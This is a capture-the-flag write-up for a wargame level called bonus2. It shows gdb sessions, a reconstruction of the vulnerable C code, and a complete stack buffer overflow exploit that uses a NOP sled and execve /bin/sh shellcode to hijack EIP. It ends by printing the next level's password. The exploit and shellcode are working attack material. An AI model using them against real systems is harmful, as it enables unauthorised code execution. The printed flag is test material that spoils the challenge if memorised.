# Exploit

We need 2 parameters in order to make the program print something
```
   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3 ; compare program parameter count to 3
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    eax,0x1
   0x08048543 <+26>:	jmp    0x8048630 <main+263>    ; return (1) exit program
```

Example
```
bonus2@RainFall:~$ ./bonus2 ok ok
Hello ok
```

We can observe with the C translation
```
    memset(buffer, 0x0, 76);
    strncpy(buffer, av[1], 40);
    strncpy(buffer+40, av[2], 32);
```
We can have a continuous buffer if we fill the first parameter with 40 characters, this will make display the second parameter
```
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 32')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)
```

Let's check with gdb why there is a crash here
```
(gdb) r $(python -c 'print "A" * 40') $(python -c 'print "B" * 32')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 32')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
```
EIP is somehow partly overwritten by filling the entire buffer.
We need to completely take control over EIP in order to get the exploit to work
Let's dig into the rest of the program
```
  int main()
  {
    char buffer[80];
    ...
    lang = getenv("LANG");
    if (memcmp(lang, "fi", 2) == 0)
        language = 1;
    else if (memcmp(lang, "nl", 2) == 0)
        language = 2;
    ...
    greetuser(buffer);
  }
  ...
  void greetuser(char *username)
  {
    char buffer[72];

    if (language == 1)
        strcpy(buffer, "Hyvää päivää ");
    else if (language == 2)
        strcpy(buffer, "Goedemiddag! ");
    else
        strcpy(buffer, "Hello ");

    strcat(buffer, username);
    puts(buffer);
  }
```
The buffer we want to exploit will be prefixed by a string depending on an environment variable `LANG` if it is set to `fi` or `nl`
Also, we understand why we previously partially overwritten EIP
The buffer of size 72 is first filled by 6 bytes `"Hello "` and then filled with our inputs with 72 bytes
We write 78 bytes in total but EIP is located at 72 + 4 (ebp) = 76
We only overwrite 2 bytes of EIP, this explain why
```
Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
```
By extending the number of byte written, we can now extend our overflow to fully take control of EIP
```
bonus2@RainFall:~$ env -i LANG=nl gdb bonus2
(gdb) r $(python -c 'print "A" * 40') $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x47474746 in ?? ()
```
`0x47474746` means `GGGF`, we only need `AAAABBBBCCCCDDDDEEEEFFF + jump address` as second parameter in order to overwrite EIP

We now need to know which address we need to jump to
```
bonus2@RainFall:~$ gdb bonus2
...
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) b greetuser
Breakpoint 1 at 0x804848a
(gdb) r ok ok
Starting program: /home/user/bonus2/bonus2 ok ok

Breakpoint 1, 0x0804848a in greetuser ()
(gdb) x/x $ebp-0x48
0xbffff620:	0x0804823c
```
The address tends to change with each execution so it may vary

We'll use a shellcode to exploit the binary
>shellcode (21 bytes)
>https://shell-storm.org/shellcode/files/shellcode-517.html
>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80

```
LANG=nl ./bonus2 $(python -c 'print "\x90" * 19 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"') $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFF" + "\xbf\xff\xf5\x27"[::-1]') # the address may vary
```
The first 19 bytes is a NOP sled in order to have some margin when jumping

buffer address `0xbffff620` (at the time of exploit, change value as needed)
```
+13 (Goedemiddag! )
0xbffff620
0xbffff62d
+10 more or less
0xbffff637
```

```
bonus2@RainFall:~$ LANG=nl ./bonus2 $(python -c 'print "\x90" * 19 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"') $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFF" + "\xbf\xff\xf6\x37"[::-1]')
Goedemiddag! �������������������1���Qh//shh/bin��
                                                 AAAABBBBCCCCDDDDEEEEFFF���
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
